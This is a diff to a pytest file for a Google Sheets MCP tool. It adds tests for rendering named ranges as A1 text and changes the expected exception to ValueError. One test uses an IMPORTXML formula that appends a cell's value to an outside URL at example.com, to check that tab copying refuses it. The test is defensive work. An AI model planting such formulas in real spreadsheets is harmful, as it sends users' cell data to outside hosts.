@@ -1,6 +1,5 @@
 import pytest
-from sheets_mcp import tabs
-from sheets_mcp.errors import SheetsError
+from sheets_mcp import a1, tabs
 
 
 def tab_titles(fake, book):
@@ -19,6 +18,58 @@ def test_describe_counts_positions_from_one(fake, clients):
     assert described['title'] == 'Book'
     assert [(tab['title'], tab['position'], tab['rows']) for tab in described['tabs']] == [
         ('Data', 1, 1000), ('Notes', 2, 1000)]
+
+
+def test_describe_named_ranges_parse(fake, clients):
+    """Verify each named range renders as A1 text parse_range accepts,
+    with an omitted start index read as row or column 1.
+
+    Mutation: an omitted start index left as None, which renders
+    'Data'!:F10 for a range from A1; or a bare sheetId given cell bounds.
+    Oracle: hand-written A1 text for four JSON shapes the API returns.
+    """
+    book = fake.add_spreadsheet('Book', {'Data': []})
+    sheet_id = fake.files[book]['tabs'][0]['properties']['sheetId']
+    fake.files[book]['namedRanges'] = [
+        {'name': 'Block', 'range': {
+            'sheetId': sheet_id, 'endRowIndex': 10, 'endColumnIndex': 6}},
+        {'name': 'Column', 'range': {
+            'sheetId': sheet_id, 'startColumnIndex': 5, 'endColumnIndex': 6}},
+        {'name': 'Rows', 'range': {
+            'sheetId': sheet_id, 'startRowIndex': 2, 'endRowIndex': 5}},
+        {'name': 'Tab', 'range': {'sheetId': sheet_id}},
+        ]
+    described = tabs.describe_spreadsheet(clients, book)
+    rendered = [named['range'] for named in described['named_ranges']]
+    assert rendered == ["'Data'!A1:F10", "'Data'!F:F", "'Data'!3:5", "'Data'"]
+    for text in rendered:
+        a1.parse_range(text)
+
+
+def test_describe_named_range_open_end_takes_grid_edge(fake, clients):
+    """Verify an open end A1 cannot write renders at the grid edge, and an
+    open row end beside bounded columns stays open.
+
+    Mutation: leaving an open end as None, which renders 'Data'!3: and
+    parses as row 3 alone; or filling every open row end, which turns
+    'Data'!A2:F into 'Data'!A2:F1000.
+    Oracle: the fake's 1000-row, 26-column grid, so row 1000 and column Z.
+    """
+    book = fake.add_spreadsheet('Book', {'Data': []})
+    sheet_id = fake.files[book]['tabs'][0]['properties']['sheetId']
+    fake.files[book]['namedRanges'] = [
+        {'name': 'FromRow', 'range': {'sheetId': sheet_id, 'startRowIndex': 2}},
+        {'name': 'FromColumn', 'range': {'sheetId': sheet_id, 'startColumnIndex': 2}},
+        {'name': 'FromCell', 'range': {
+            'sheetId': sheet_id, 'startRowIndex': 4, 'startColumnIndex': 2}},
+        {'name': 'OpenRows', 'range': {
+            'sheetId': sheet_id, 'startRowIndex': 1, 'endColumnIndex': 6}},
+        ]
+    described = tabs.describe_spreadsheet(clients, book)
+    rendered = [named['range'] for named in described['named_ranges']]
+    assert rendered == ["'Data'!3:1000", "'Data'!C:Z", "'Data'!C5:Z", "'Data'!A2:F"]
+    assert a1.parse_range(rendered[0]) == a1.CellRange(
+        tab='Data', first_row=3, last_row=1000)
 
 
 def test_add_tab_at_position(fake, clients):
@@ -73,7 +124,7 @@ def test_edit_tab_needs_a_change(fake, clients):
     Oracle: no request is recorded.
     """
     book = fake.add_spreadsheet('Book', {'Data': []})
-    with pytest.raises(SheetsError):
+    with pytest.raises(ValueError):
         tabs.edit_tab(clients, book, 'Data')
     assert fake.requests == []
 
@@ -108,7 +159,7 @@ def test_delete_tab_and_unknown_tab_message(fake, clients):
     book = fake.add_spreadsheet('Book', {'Data': [], 'Scratch': []})
     tabs.delete_tab(clients, book, 'Scratch')
     assert tab_titles(fake, book) == ['Data']
-    with pytest.raises(SheetsError, match=r"no tab 'data'; the tabs are \['Data'\]"):
+    with pytest.raises(ValueError, match=r"no tab 'data'; the tabs are \['Data'\]"):
         tabs.delete_tab(clients, book, 'data')
 
 
@@ -134,6 +185,6 @@ def test_copy_tab_across_refuses_url_formula(fake, clients):
     source = fake.add_spreadsheet(
         'Source', {'T': [['=IMPORTXML("https://example.com/?"&A1, "//a")']]})
     target = fake.add_spreadsheet('Target', {'Sheet1': []})
-    with pytest.raises(SheetsError, match='IMPORTXML'):
+    with pytest.raises(ValueError, match='IMPORTXML'):
         tabs.copy_tab(clients, source, 'T', target)
     assert tab_titles(fake, target) == ['Sheet1']
